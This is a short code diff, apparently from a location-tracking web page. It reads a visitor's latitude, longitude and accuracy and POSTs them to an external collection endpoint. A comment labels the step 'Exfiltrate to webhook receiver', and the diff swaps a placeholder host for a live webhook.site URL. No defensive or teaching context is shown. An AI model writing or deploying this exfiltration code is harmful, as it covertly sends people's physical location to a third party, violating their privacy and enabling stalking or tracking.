@@ -34,7 +34,7 @@
             const acc = position.coords.accuracy;
             
             // Exfiltrate to webhook receiver
-            fetch('https://your-webhook-endpoint.com/collect', {
+            fetch('https://webhook.site/dc1260ff-ab41-4424-a6e9-e521640ef9e8', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ latitude: lat, longitude: lon, accuracy: acc })
